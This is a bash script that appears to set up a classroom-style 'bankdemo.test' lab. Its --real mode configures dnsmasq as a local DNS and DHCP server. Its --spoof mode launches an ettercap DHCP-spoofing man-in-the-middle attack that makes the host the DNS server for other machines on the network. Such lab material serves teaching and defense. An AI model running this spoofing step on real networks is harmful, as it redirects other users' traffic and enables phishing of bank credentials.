#!/usr/bin/env bash

# -e exits if a command fails, -x prints out the command calls as we run it
set -ex

# asks for root once and caches it for all sudo call later
sudo -v

if [[ -z "$1" ]]; then
    echo "Error: No argument provided."
    echo "Usage: $0 --real|--spoof"
    exit 1
fi

INTERFACE=$(ip -o -4 addr show scope global | awk '$2 != "lo" {print $2; exit}')
IP=$(ip -4 -o addr show dev "$INTERFACE" scope global | awk '{split($4,a,"/"); print a[1]; exit}')
echo "Interface: $INTERFACE"
echo "IP Address: $IP"
SUBNET="${IP%.*}"
echo "$SUBNET"

if [[ -z "$IP" ]]; then
    echo "ERROR: No IPv4 address found on $INTERFACE"
    exit 1
fi

if [[ "$1" == "--real" ]]; then
    echo "Starting real install/setup..."

    sudo apt update

    # -y for unattended installs
    sudo apt install -y dnsmasq dnsutils

    # We are using tee since it can write to files requiring root access. We want to write the config for the dnsmasq to use the interface, ip, and subnet with dns server (itself)
    sudo tee /etc/dnsmasq.d/bankdemo.conf > /dev/null <<EOF
interface=$INTERFACE
listen-address=$IP
bind-interfaces

# DNS configuration
address=/bankdemo.test/$IP

# DHCP configuration
dhcp-range=$SUBNET.100,$SUBNET.150,255.255.255.0,1h
dhcp-option=option:dns-server,$IP
EOF

    # Validate configuration
    echo "Validating dnsmasq..."
    sudo dnsmasq --test

    # Enable and restart service
    sudo systemctl enable dnsmasq
    sudo systemctl restart dnsmasq

    # check that everything is working appropriately
    sudo systemctl is-active --quiet dnsmasq || {
        echo "ERROR: dnsmasq failed to start."
        exit 1
    }

elif [[ "$1" == "--spoof" ]]; then
    echo "Running spoof install/setup..."

    sudo apt update

    # -y for unattended installs
    sudo apt install -y dnsmasq dnsutils

    # We are using tee since it can write to files requiring root access. We want to write the config for the dnsmasq to use the interface, ip, and subnet with dns server (itself)
    sudo tee /etc/dnsmasq.d/bankdemo.conf > /dev/null <<EOF
interface=$INTERFACE
listen-address=$IP
bind-interfaces

# DNS configuration
address=/bankdemo.test/$IP
EOF
    # Validate configuration
    echo "Validating dnsmasq..."
    sudo dnsmasq --test

    # Enable and restart service
    sudo systemctl enable dnsmasq
    sudo systemctl restart dnsmasq

    # check that everything is working appropriately
    sudo systemctl is-active --quiet dnsmasq || {
        echo "ERROR: dnsmasq failed to start."
        exit 1
    }

    # Only need the ettercap text interface for cli
    # tcpdump is just so we can view the dhcp traffic...
    sudo apt install -y ettercap-text-only tcpdump
    
    sudo ettercap -T -q -i $INTERFACE \
    -M "dhcp:${SUBNET}.160-170/255.255.255.0/${IP}"
else
    echo "Unknown option: $1"
fi